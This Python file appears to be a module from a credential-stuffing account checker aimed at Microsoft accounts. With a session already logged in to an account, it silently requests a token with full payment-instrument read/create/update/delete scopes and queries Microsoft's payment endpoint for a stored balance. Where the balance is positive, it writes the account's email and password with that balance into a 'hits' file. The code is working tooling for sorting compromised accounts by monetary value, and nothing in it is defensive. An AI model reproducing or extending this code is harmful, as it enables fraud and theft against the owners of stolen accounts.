import re
import json
import time
import requests
from urllib.parse import urlparse, parse_qs


def _get_auth_token(session, client_id, scope, redirect_uri, config, token_cache=None):
    cache_key = f'{client_id}:{scope}:{redirect_uri}'
    if token_cache is not None and cache_key in token_cache:
        token_data = token_cache[cache_key]
        if time.time() - token_data['timestamp'] < 300:
            return token_data['token']
    try:
        auth_url = (
            f'https://login.live.com/oauth20_authorize.srf'
            f'?client_id={client_id}&response_type=token&scope={scope}'
            f'&redirect_uri={redirect_uri}&prompt=none'
        )
        r = session.get(auth_url, timeout=int(config.get('timeout', 10)))
        token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
        if token and token_cache is not None:
            token_cache[cache_key] = {'token': token, 'timestamp': time.time()}
        return token
    except Exception:
        return None


def check_balance(session, config, token_cache=None):
    try:
        token = _get_auth_token(
            session,
            '000000000004773A',
            'PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete',
            'https://account.microsoft.com/auth/complete-silent-delegate-auth',
            config,
            token_cache
        )
        if not token:
            return None
        headers = {
            'Authorization': f'MSADELEGATE1.0={token}',
            'Accept': 'application/json'
        }
        r = session.get(
            'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB',
            headers=headers,
            timeout=15
        )
        if r.status_code == 200:
            balance_match = re.search(r'"balance":(\d+\.?\d*)', r.text)
            if balance_match:
                balance = balance_match.group(1)
                currency_match = re.search(r'"currency":"([A-Z]{3})"', r.text)
                currency = currency_match.group(1) if currency_match else 'USD'
                return f'{balance} {currency}'
        return None
    except (requests.RequestException, TimeoutError, ConnectionError, json.JSONDecodeError):
        return None


def fetch_balance(session, email, password, config, fname, write_dedupe, token_cache=None):
    if not config.get('check_microsoft_balance'):
        return None
    balance = check_balance(session, config, token_cache)
    if balance:
        try:
            amount_str = re.sub(r'[^\d\.]', '', str(balance))
            if amount_str and float(amount_str) > 0:
                write_dedupe(fname, 'Microsoft_Balance.txt', f'{email}:{password} | Balance: {balance}\n')
                return balance
        except Exception:
            pass
    return None
